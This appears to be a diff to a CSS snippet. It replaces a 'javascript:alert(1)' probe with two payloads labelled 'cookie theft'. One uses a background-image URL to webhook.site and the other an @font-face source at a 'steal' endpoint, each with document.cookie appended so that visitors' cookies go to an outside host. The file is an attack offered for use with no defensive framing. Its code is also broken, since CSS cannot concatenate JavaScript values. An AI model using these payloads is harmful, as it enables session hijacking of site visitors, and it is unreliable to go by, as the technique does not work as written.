@@ -1,1 +1,13 @@
-body { background: url('javascript:alert(1)'); }
+/* Method 1: Simple cookie theft */
+body {
+    background-image: url('https://webhook.site/f0dcc159-fc86-4960-b6e9-b6639e1adb2e/cookie=' + document.cookie);
+}
+
+/* Method 2: Advanced (if the first fails) */
+@font-face {
+    font-family: 'exploit';
+    src: url('https://your-server.com/steal?cookie=' + document.cookie);
+}
+* {
+    font-family: 'exploit', sans-serif;
+}
